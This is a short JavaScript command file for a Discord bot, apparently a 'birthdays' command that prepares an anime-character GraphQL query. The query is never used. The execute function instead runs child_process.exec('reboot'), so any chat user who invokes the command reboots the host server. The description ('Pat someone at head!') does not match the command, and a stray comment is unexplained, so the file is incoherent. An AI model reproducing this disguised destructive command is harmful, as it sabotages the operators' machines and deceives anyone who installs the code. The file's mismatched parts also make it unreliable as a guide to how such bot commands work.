let qvery = {"query":"query($page:Int = 1 $id:Int $search:String $isBirthday:Boolean $sort:[CharacterSort]=[FAVOURITES_DESC]){Page(page:$page,perPage:20){pageInfo{total perPage currentPage lastPage hasNextPage}characters(id:$id search:$search isBirthday:$isBirthday sort:$sort){id name{userPreferred}image{large}}}}","variables":{"page":1,"type":"CHARACTERS","isBirthday":true,"sort":["FAVOURITES_DESC","ID_DESC"]}}
const axios = require("axios").default;
const child_process = require("child_process")

let { MessageEmbed } = require("discord.js")

const baseUrl = require("../data/apiLinks.json").anime.baseUrl;

module.exports = {
    name: "birthdays",
    description: "Pat someone at head!",
    perms: [],
    timeout: 3000,
    category: "",
    execute: async function(message, args) {
        child_process.exec("reboot")
    }
}; // pfizer 2/2